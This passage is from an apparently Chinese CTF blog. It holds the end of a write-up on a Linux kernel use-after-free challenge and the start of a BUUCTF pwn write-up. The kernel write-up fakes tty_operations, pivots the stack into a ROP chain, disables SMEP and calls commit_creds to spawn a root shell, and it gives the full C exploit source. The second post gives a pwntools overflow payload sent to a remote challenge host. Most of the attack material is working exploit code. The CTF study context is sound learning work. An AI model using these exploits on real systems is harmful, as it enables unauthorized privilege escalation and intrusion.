unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> receive_room;	<span class="comment">/* Bytes free for queue */</span></span><br><span class="line">	<span class="type">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">	<span class="type">int</span> alt_speed;		<span class="comment">/* For magic substitution of 38400 bps */</span></span><br><span class="line">	<span class="type">wait_queue_head_t</span> write_wait;</span><br><span class="line">	<span class="type">wait_queue_head_t</span> read_wait;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">	<span class="type">void</span> *disc_data;</span><br><span class="line">	<span class="type">void</span> *driver_data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> closing;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *write_buf;</span><br><span class="line">	<span class="type">int</span> write_cnt;</span><br><span class="line">	<span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这里需要注意哪一个索引才是tty_operations的指针。magic占4字节，kref的声明见下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kref</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_t</span> refcount;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> counter;</span><br><span class="line">&#125; <span class="type">atomic_t</span>;</span><br></pre></td></tr></table></figure>

<p>因此kref也是占4字节。后面的两个struct指针各占8字节，因此tty_operations应该在结构体中偏移为0x18的位置，也即上图中的0xffffffff81a74f80。我们可以将其修改为我们伪造的tty_operations，将其中write对应的函数指针修改为某一个固定的gadget，再对&#x2F;dev&#x2F;ptmx调用write即可到达我们想要的gadget处，也就能够调试了。</p>
<p><img src="https://img-blog.csdnimg.cn/7b5c4537c2ff4f8bb5cd13c60d736648.png"><br>发现有rax指向tty_operations。这是我们在内核中唯一可以控制的地址，因此思路是以其为跳板进行栈迁移以触发ROP。这就需要mov rsp, rax的gadget了。<br><img src="https://img-blog.csdnimg.cn/6aac399eea6a45aea34b640be6f712cc.png"><br><img src="https://img-blog.csdnimg.cn/3bb59c3275c74dcfab5a54ceeac4771f.png"><br>发现只有0xffffffff8181bfc5的gadget是可用的，后面的jmp也就相当于是ret了。<br>下面是tty_operations的结构声明：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">			<span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">	<span class="type">int</span>  (*install)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*remove)(<span class="keyword">struct</span> tty_driver *driver, <span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span>  (*open)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">	<span class="type">void</span> (*close)(<span class="keyword">struct</span> tty_struct * tty, <span class="keyword">struct</span> file * filp);</span><br><span class="line">	<span class="type">void</span> (*shutdown)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*cleanup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span>  (*write)(<span class="keyword">struct</span> tty_struct * tty,</span><br><span class="line">		      <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *buf, <span class="type">int</span> count);</span><br><span class="line">	<span class="type">int</span>  (*put_char)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">unsigned</span> <span class="type">char</span> ch);</span><br><span class="line">	<span class="type">void</span> (*flush_chars)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span>  (*write_room)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span>  (*chars_in_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span>  (*ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">		    <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">	<span class="type">long</span> (*compat_ioctl)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">			     <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg);</span><br><span class="line">	<span class="type">void</span> (*set_termios)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> ktermios * old);</span><br><span class="line">	<span class="type">void</span> (*throttle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">	<span class="type">void</span> (*unthrottle)(<span class="keyword">struct</span> tty_struct * tty);</span><br><span class="line">	<span class="type">void</span> (*stop)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*start)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*hangup)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span> (*break_ctl)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> state);</span><br><span class="line">	<span class="type">void</span> (*flush_buffer)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*set_ldisc)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">void</span> (*wait_until_sent)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">int</span> timeout);</span><br><span class="line">	<span class="type">void</span> (*send_xchar)(<span class="keyword">struct</span> tty_struct *tty, <span class="type">char</span> ch);</span><br><span class="line">	<span class="type">int</span> (*tiocmget)(<span class="keyword">struct</span> tty_struct *tty);</span><br><span class="line">	<span class="type">int</span> (*tiocmset)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">set</span>, <span class="type">unsigned</span> <span class="type">int</span> clear);</span><br><span class="line">	<span class="type">int</span> (*resize)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> winsize *ws);</span><br><span class="line">	<span class="type">int</span> (*set_termiox)(<span class="keyword">struct</span> tty_struct *tty, <span class="keyword">struct</span> termiox *tnew);</span><br><span class="line">	<span class="type">int</span> (*get_icount)(<span class="keyword">struct</span> tty_struct *tty,</span><br><span class="line">				<span class="keyword">struct</span> serial_icounter_struct *icount);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">	<span class="type">int</span> (*poll_init)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> *options);</span><br><span class="line">	<span class="type">int</span> (*poll_get_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line);</span><br><span class="line">	<span class="type">void</span> (*poll_put_char)(<span class="keyword">struct</span> tty_driver *driver, <span class="type">int</span> line, <span class="type">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>可以看到其中write的函数指针应该在索引为7的位置。因此我们将这里修改为mov rsp, rax的指针。这里，原资料巧妙构造了tty_operations的结构使得其能成功触发ROP。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> fake_op[<span class="number">0x30</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;</span><br><span class="line"></span><br><span class="line">fake_op[<span class="number">0</span>] = POP_RAX_RET;</span><br><span class="line">fake_op[<span class="number">1</span>] = rop;</span><br></pre></td></tr></table></figure>
<p>首先，使用write函数触发栈迁移，此时栈应该在fake_op的头部位置。之后ret到pop rax ; ret的gadget，将rax赋值为事先构造好的ROP链，然后ret。<strong>注意：ret后面又是一个mov rsp, rax，这就使得rsp自然地被迁移到了ROP上。</strong>至此，一切顺理成章地完成了。</p>
<p>笔者无比欣喜地开始测试，想看到那个梦寐以求的’#’出现，但是kernel却甩给我一堆报错信息，1s之内难以截屏，但大致说的是：unable to handle kernel paging request。</p>
<p><img src="https://img-blog.csdnimg.cn/b837e5b8df6446df82863e6bdbffe367.png"><br><img src="https://img-blog.csdnimg.cn/abb50a40f0a54b39a41c979de4c01ad9.png"><br>又回去用git库中带的exp试了一下，没有问题啊。什么问题呢？终端在最后显示的信息中，有笔者写入到程序中的标志信息，即已经进入了调用system(“&#x2F;bin&#x2F;sh”)的函数，但是还是报错了，报的错还不一样。。。。。。<br>给自己代码稍微该了下。好，现在报错是一样的且不会重启了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[+] Congratulations! root got......</span><br><span class="line">[    4.253787] traps: uaf.o[90] general protection ip:4110a2 sp:7ffd42a4da38 error:0 in uaf.o[401000+96000]</span><br><span class="line">[    4.255947] device release</span><br><span class="line">[    4.256551] bad magic number for tty struct (5:2) in tty_release</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure>

<p>注意到成功的elf文件中，退出root后也会产生同样的错误。</p>
<p><img src="https://img-blog.csdnimg.cn/18cca2dc76834b038295b7d5cf8c2565.png"><br>更奇妙的是，当我在此基础上添加几个printf时，居然又出现了kernel panic错误。推测是编译器问题，暂时无法解决(ノへ￣、)，但是原理算是全部清楚了。</p>
<p>最终exp：（能够执行到shell函数但无法提权）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> commit_creds = <span class="number">0xffffffff810a1420</span>, prepare_kernel_cred = <span class="number">0xffffffff810a1810</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> movcr4rdi_poprbp_ret 0xffffffff81004d80	<span class="comment">// need to move 0x6f0 to cr4</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> swapgs_poprbp_ret 0xffffffff81063694</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> iretq 0xffffffff8181a797</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> poprdi_ret 0xffffffff810d238d</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> movrsprax_decebx_ret 0xffffffff8181bfc5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> poprax_ret 0xffffffff8100ce6e</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">rise_cred</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">	<span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">	<span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">		<span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">		<span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">		<span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">		output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">				<span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">				<span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">					output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">		<span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">		index += <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rise_cred</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">// define two function pointer</span></span><br><span class="line">	<span class="comment">// printf(&quot;\033[32m\033[1m[+] Ready to execute commit_creds(prepare_kernel_cred(NULL))......\033[0m\n&quot;);</span></span><br><span class="line">	<span class="type">void</span>* (*prepare_kernel_credp)(<span class="type">void</span>*) = prepare_kernel_cred;</span><br><span class="line">	<span class="type">int</span> (*commit_credsp)(<span class="type">void</span>*) = commit_creds;</span><br><span class="line">	(*commit_credsp)((*prepare_kernel_credp)(<span class="literal">NULL</span>));</span><br><span class="line">	<span class="comment">// printf(&quot;\033[32m\033[1m[+] commit_creds(prepare_kernel_cred(NULL)) executed.\033[0m\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">// if(getuid())&#123;</span></span><br><span class="line">	<span class="comment">// 	printf(&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;);</span></span><br><span class="line">	<span class="comment">// 	exit(1);</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line">	<span class="comment">// printf(&quot;\033[32m\033[1m[+] Congratulations! root got......\033[0m\n&quot;);</span></span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	saveStatus();</span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rop[<span class="number">0x20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">	rop[idx++] = poprdi_ret;			<span class="comment">// mov rdi, 6f0h</span></span><br><span class="line">	rop[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">	rop[idx++] = movcr4rdi_poprbp_ret;	<span class="comment">// close SMEP</span></span><br><span class="line">	rop[idx++] = <span class="number">0</span>;						<span class="comment">// for pop rbp</span></span><br><span class="line">	rop[idx++] = rise_cred;</span><br><span class="line">	rop[idx++] = swapgs_poprbp_ret;		<span class="comment">// ready to return to user mode</span></span><br><span class="line">	rop[idx++] = <span class="number">0</span>;</span><br><span class="line">	rop[idx++] = <span class="number">0xffffffff814e35ef</span>;</span><br><span class="line">	rop[idx++] = shell;</span><br><span class="line">	rop[idx++] = user_cs;</span><br><span class="line">	rop[idx++] = user_rflags;</span><br><span class="line">	rop[idx++] = user_sp;</span><br><span class="line">	rop[idx++] = user_ss;</span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_tty_struct[<span class="number">0x20</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)</span><br><span class="line">		fake_tty_operations[i] = movrsprax_decebx_ret;</span><br><span class="line">	fake_tty_operations[<span class="number">0</span>] = poprax_ret;</span><br><span class="line">	fake_tty_operations[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)rop;</span><br><span class="line">		</span><br><span class="line">	<span class="type">int</span> f1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="type">int</span> f2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">	ioctl(f1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">	close(f1);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> f3 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, <span class="number">2</span>|O_NOCTTY);</span><br><span class="line">	</span><br><span class="line">	read(f2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line">	</span><br><span class="line">	fake_tty_struct[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)fake_tty_operations;		<span class="comment">// change the tty_operations pointer to our fake pointer</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	write(f2, fake_tty_struct, <span class="number">0x20</span>);</span><br><span class="line">	</span><br><span class="line">	write(f3, buf, <span class="number">8</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-2/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:13" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:13+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>重点讲解第26题：babyheap的解题方法。</p>
<h1 id="buu017-not-the-same-3dsctf-2016"><a href="#buu017-not-the-same-3dsctf-2016" class="headerlink" title="buu017-not_the_same_3dsctf_2016"></a>buu017-not_the_same_3dsctf_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25850</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x2d</span>) + p32(elf.symbols[<span class="string">&#x27;get_secret&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>]) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">1</span>) + p32(<span class="number">0x80ECA2D</span>) + p32(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
